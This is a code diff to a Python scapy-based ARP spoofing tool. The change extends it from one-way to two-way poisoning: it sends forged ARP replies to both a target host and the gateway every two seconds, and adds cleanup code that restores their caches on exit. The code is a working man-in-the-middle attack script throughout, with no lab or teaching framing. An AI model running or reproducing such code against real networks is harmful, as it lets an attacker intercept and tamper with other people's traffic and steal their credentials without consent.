@@ -8,6 +8,8 @@ def sniff_packets():
 
 class ArpSpoofer:
     default_gateway_ip = None
+    target_ethernet = None
+    gateway_ethernet = None
 
     def __init__(self):
         pass
@@ -30,30 +32,46 @@ class ArpSpoofer:
     def rm_address_arp_cache(self, ip_address):
         command = 'arp -d ' + ip_address
         clean_subprocess(command, -1)
+
+    def create_ether_packets(self, target_mac, gateway_mac):
+        self.target_ethernet = scapy.Ether(dst=target_mac)
+        self.gateway_ethernet = scapy.Ether(dst=gateway_mac)
+
     def spoof(self, gateway_ip, target_ip):
         try:
             while True:
                 target_mac = self.get_mac_address(target_ip)
                 gateway_mac = self.get_mac_address(gateway_ip)
 
-                ether_1 = scapy.Ether(dst=target_mac)
-                # ether_2 = scapy.Ether(dst=gateway_mac)
+                self.create_ether_packets(target_mac, gateway_mac)
 
-                arp_packet_1 = scapy.ARP(op = 2, psrc=gateway_ip, pdst=target_ip , hwdst=target_mac)
-                # arp_packet_2 = scapy.ARP(op = 2, psrc=target_ip, pdst=gateway_ip, hwdst=gateway_mac)
+                target_arp = scapy.ARP(op = 2, psrc=gateway_ip, pdst=target_ip , hwdst=target_mac)
+                gateway_arp = scapy.ARP(op = 2, psrc=target_ip, pdst=gateway_ip, hwdst=gateway_mac)
 
                 # Combine the Ethernet frame with the ARP packet
-                packet_1 = ether_1 / arp_packet_1
-                # packet_2 = ether_2 / arp_packet_2
+                target_packet = self.target_ethernet / target_arp
+                gateway_packet = self.gateway_ethernet / gateway_arp
 
                 # Send the packet
-                print(packet_1.show())
-                # print(packet_2.show())
+                print(target_packet.show())
+                print(gateway_packet.show())
 
-                scapy.send(packet_1)
-                # scapy.send(packet_2)
+                scapy.sendp(target_packet, iface="eth0")
+                scapy.sendp(gateway_packet, iface="eth0")
 
                 time.sleep(2)
         except KeyboardInterrupt:
-            print(" exiting arpspoof...")
-            # TODO: Implement Restoring Their Arp Cache
+            print(" exiting arpspoof... cleaning up...")
+
+            target_mac = self.get_mac_address(target_ip)
+            gateway_mac = self.get_mac_address(gateway_ip)
+
+            target_arp = scapy.ARP(op = 2, psrc=gateway_ip, hwsrc=gateway_mac, pdst=target_ip , hwdst=target_mac)
+            gateway_arp = scapy.ARP(op = 2, psrc=target_ip, hwsrc=target_mac , pdst=gateway_ip, hwdst=gateway_mac)
+
+            # Combine the Ethernet frame with the ARP packet
+            target_packet = self.target_ethernet / target_arp
+            gateway_packet = self.gateway_ethernet / gateway_arp
+
+            scapy.sendp(target_packet, iface="eth0")
+            scapy.sendp(gateway_packet, iface="eth0")
